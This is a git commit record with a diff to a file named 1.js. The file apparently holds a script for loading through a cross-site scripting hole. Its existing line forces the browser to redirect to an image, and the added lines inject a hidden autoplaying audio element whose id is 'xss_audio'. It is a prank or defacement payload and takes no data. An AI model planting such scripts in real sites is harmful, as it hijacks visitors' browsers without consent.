37c56c90ea1329d979d1bf3af520331c71d5f992
andy1337 <oneshot2k12@gmail.com>
2020-04-12 05:40:24 +0300

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,10 @@
 window.location.href = "https://i.ibb.co/TkwjgsW/image.png";
+if(document.getElementById('xss_audio') == null ) {
+	var a = document.createElement('audio');
+	a.src = "http://127.0.0.1/music/LesRatsQuittentLeNavire.mp3"
+	a.autoplay=true;
+	a.id='xss_audio';
+	a.style.display='none';
+	document.body.appendChild(a);
+}
+
